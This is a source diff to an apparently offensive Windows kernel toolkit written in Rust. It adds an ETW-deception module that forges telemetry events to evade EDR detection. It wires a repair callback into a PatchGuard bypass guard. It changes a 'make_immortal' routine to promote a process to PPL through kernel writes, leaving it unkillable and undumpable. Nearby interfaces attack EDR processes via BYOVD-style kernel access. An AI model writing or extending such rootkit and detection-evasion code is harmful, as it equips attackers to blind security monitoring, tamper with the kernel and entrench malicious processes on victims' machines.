@@ -95,6 +95,10 @@ pub mod pagewalk;
 /// ntoskrnl pattern scan (byte-signature → RVA) — pure algorithm, host-testable.
 /// The fallback offset resolver for unknown builds.
 pub mod pattern_scan;
+/// ETW Deception — event forgery + frequency keeper (Bypass Complete Phase 4).
+/// Forges synthetic ETW events that match real kernel-provider cadence, defeating
+/// frequency/content-based detection when the ETW-TI blind is active.
+pub mod etw_deception;
 /// Windows-specific kernel-tier shells (BYOVD/KslD/DMA `KernelRw` impls +
 /// symbol resolution). Empty for now — algorithms live in the sibling modules;
 /// this is where the Windows-only bootstrap lands.
@@ -257,14 +261,47 @@ pub trait PatchGuardKit {
 
 /// RAII guard: the unchecked window is open while it lives; `Drop` repairs.
 /// Borrows the kit so it cannot be dropped mid-window.
+///
+/// The `repair` callback is set by the specific PG bypass implementation
+/// (`TimingRepairWindow` or `RuntimePgBypassWindow`) and performs the
+/// necessary cleanup when the guard is dropped — e.g., re-enabling PG
+/// validation or resuming the suspended validation thread.
 #[must_use = "the PG guard repairs on Drop; leaking it leaves the kernel tampered"]
 pub struct PgGuard<'a> {
-    _kit: &'a dyn PatchGuardKit,
+    kit: &'a dyn PatchGuardKit,
+    /// Repair callback invoked on Drop. Set by the concrete PG bypass impl.
+    /// When `Some`, the closure performs PG state restoration (re-arm, thread
+    /// resume, etc.). When `None`, the guard is a no-op (for the skeleton
+    /// `PatchGuardWindow` which refuses without a real probe).
+    repair: Option<alloc::boxed::Box<dyn FnMut() + 'a>>,
 }
+
+impl<'a> PgGuard<'a> {
+    /// Create a new PgGuard with a repair callback. Called by the concrete
+    /// PG bypass impls (`TimingRepairWindow`, `RuntimePgBypassWindow`).
+    pub fn new(kit: &'a dyn PatchGuardKit, repair_fn: impl FnMut() + 'a) -> Self {
+        Self {
+            kit,
+            repair: Some(alloc::boxed::Box::new(repair_fn)),
+        }
+    }
+
+    /// Create a no-op guard (skeleton — no real PG bypass wired).
+    /// Returns `UnsupportedPosture` if the repair is needed. Used by the
+    /// skeleton `PatchGuardWindow` which refuses without a real probe.
+    pub(crate) fn noop(kit: &'a dyn PatchGuardKit) -> Self {
+        Self { kit, repair: None }
+    }
+}
+
 impl<'a> Drop for PgGuard<'a> {
     fn drop(&mut self) {
-        // Impl-specific repair / re-arm hook. The default is a no-op so the
-        // floor (`NoKernel`) compiles; real impls override via a stored fn.
+        // Invoke the repair callback if one was set by the concrete impl.
+        // This performs PG state restoration: re-enabling the validation flag,
+        // resuming the suspended thread, etc.
+        if let Some(mut repair) = self.repair.take() {
+            repair();
+        }
     }
 }
 
@@ -277,7 +314,10 @@ pub trait ProcHideKit {
 /// process to PPL ("Process Immortality" — un-killable / un-dumpable).
 pub trait PplKit {
     fn attack_edr_ppl(&self, krw: &dyn KernelRw, pid: u32) -> Result<(), KitError>;
-    fn make_immortal(&self, pid: u32) -> Result<(), KitError>;
+    /// Promote `pid` to PPL (Protected | WinSystem). Requires a `KernelRw` to
+    /// write `EPROCESS.Protection` + `SignatureLevel` + `SectionSignatureLevel`.
+    /// Once promoted the process is unkillable and undumpable from user-mode.
+    fn make_immortal(&self, krw: &dyn KernelRw, pid: u32) -> Result<(), KitError>;
 }
 
 // ---- §4 Credentials -------------------------------------------------------
@@ -350,7 +390,7 @@ impl PplKit for NoKernel {
     fn attack_edr_ppl(&self, _krw: &dyn KernelRw, _pid: u32) -> Result<(), KitError> {
         Err(KitError::UnsupportedPosture("NoKernel floor"))
     }
-    fn make_immortal(&self, _pid: u32) -> Result<(), KitError> {
+    fn make_immortal(&self, _krw: &dyn KernelRw, _pid: u32) -> Result<(), KitError> {
         Err(KitError::UnsupportedPosture("NoKernel floor"))
     }
 }
